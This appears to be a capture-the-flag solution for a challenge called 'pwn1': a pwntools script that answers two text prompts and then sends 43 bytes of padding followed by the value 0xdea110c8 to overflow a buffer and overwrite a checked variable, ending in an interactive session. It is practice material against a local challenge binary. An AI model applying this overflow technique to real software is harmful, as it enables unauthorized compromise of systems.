---
title: "pwn1"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./pwn1"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
    p = gdb.debug(binary_name, '''
    break *main+313
    continue
    ''')
else:
    p = process(binary_name)

p.recv()
p.sendline(b'Sir Lancelot of Camelot')

p.recv()
p.sendline(b'To seek the Holy Grail.')

p.recv()
p.sendline(b'a'*43 + p32(0xdea110c8))

p.interactive()
```